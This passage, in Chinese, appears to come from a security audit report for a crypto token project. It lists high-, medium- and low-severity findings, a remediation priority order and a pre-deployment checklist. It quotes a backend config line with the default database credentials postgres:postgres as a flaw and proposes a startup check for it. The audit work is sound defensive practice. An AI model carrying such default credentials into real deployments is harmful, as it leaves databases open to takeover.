**文件**: `backend/src/config.ts:21`

```typescript
DATABASE_URL: z.string().default('postgres://postgres:postgres@localhost:5432/bananacat'),
```

默认值有 `postgres:postgres`,生产环境**必须**改 `.env`,但 default 让人疏忽。

**修复**: 启动时检测默认值并报错/警告:
```typescript
if (env.DATABASE_URL.includes(':postgres@')) {
    throw new Error('DATABASE_URL must be changed from default!')
}
```

---

# 五、紧急修复优先级

## 🚨 必须立即修复(高危,主网部署前)

1. **H-3** (sandwich attack on BSC migrator) - 直接导致用户资金损失
2. **H-6** (前端钱包操作是 mock) - 用户以为成功但链上没动作
3. **H-4** (后端 API 用户身份完全不可信) - 任何人都能冒充发评论/删除评论
4. **H-2** (Migrator PERMANENT_BURN 永远不 burn) - 用户核心信任承诺失效
5. **H-5** (CORS 通配) - API 易被滥用
6. **H-1** (Factory 退款失败吞噬 fee) - 资金流失
7. **H-7** (Indexer 不校验 event 字段) - 假代币污染数据库

## ⚠️ 测试网期间修复(中危)

M-1, M-2, M-3, M-5, M-6, M-7, M-8, M-9, M-10, M-11, M-12, M-13, M-14

## 📝 后续优化(低危 / 建议)

L-1 ~ L-9, S-1 ~ S-5

---

# 六、安全检查清单(部署前)

### 智能合约
- [ ] 第三方审计(至少 Certik / Slowmist / OpenZeppelin)
- [ ] 所有 `unchecked` 块加详细注释
- [ ] 所有外部 call 加失败处理
- [ ] 滑点最小值 ≥ 1%
- [ ] `ReentrancyGuard` + `Pausable` 全加
- [ ] Foundry 测试覆盖率 ≥ 95%
- [ ] Echidna / Mythril 自动化模糊测试

### 后端
- [ ] 钱包签名验证(SIWE / EIP-4361)
- [ ] `helmet` 安全 headers
- [ ] Redis rate limit(多实例)
- [ ] trust proxy 配置
- [ ] URL/文件类型严格白名单
- [ ] Webhook URL hostname 校验

### 前端
- [ ] 接入 wagmi + viem(替代 mock)
- [ ] EIP-6963 钱包识别
- [ ] URL 协议白名单
- [ ] CSP + SRI
- [ ] XSS 渗透测试

### 索引器 / DB
- [ ] Event 字段校验(viem.getAddress + 长度)
- [ ] Factory 地址运行时校验
- [ ] 通知 webhook 超时
- [ ] 连接池密码检测

---

> 📌 **附录**: 完整 attack tree 见 `docs/SECURITY-attack-tree.md`
> 📌 **附录**: Foundry 测试用例模板见 `contracts/test/`
